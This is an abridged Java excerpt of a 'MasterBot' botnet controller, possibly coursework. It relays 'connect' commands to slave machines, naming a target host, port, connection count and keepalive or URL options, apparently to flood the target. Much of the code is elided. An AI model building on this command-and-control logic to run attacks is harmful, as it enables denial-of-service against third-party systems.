...
public class MasterBot {
    ...
    private static void connect(String slaveIP, String targetHost, String targetPort, String connections, String feature) {
            ...
            while ((line = br.readLine()) != null) {
                ...
                if ((slaveDetails[1].equals(slaveIP)) || (slaveDetails[0].equals(slaveIP)) || "all".equals(slaveIP)) {
                    ...
                    try {
                        ...
                        pw.println("connect " + targetHost + " " + targetPort  + " " + connections + " " + feature); //Sending command to slave
                    }
                    catch(IOException ex) {
        ...
        while (true) {
            try {
                ...
                if("connect".equals(args[0])) {
                    switch (args.length){
                        case 4:     //no number of connections or KeepAlive or url
                            connect(args[1],args[2],args[3],"1","no"); //if number of connections not specified, make it 1               
                            break;

                        case 5: //in this case user can either give number of connections, or KeepAlive or the url
                            if ("keepalive".equals(args[4]))
                                connect(args[1],args[2],args[3],"1","yes");
                            else if (args[4].contains("url=")){
                                String url = args[4].replace("url=","");
                                connect(args[1],args[2],args[3],"1",url);
                            }
                            else
                                connect(args[1],args[2],args[3],args[4],"no");
                            break;

                        case 6: //there surely is number of connection, and one of url or keepalive
                            if ("keepalive".equals(args[5]))
                                connect(args[1],args[2],args[3],args[4],"yes");
                            else if (args[5].contains ("url=")){
                                String url = args[5].replace("url=","");
                                connect(args[1],args[2],args[3],args[4],url);
                            }
                    }
                }
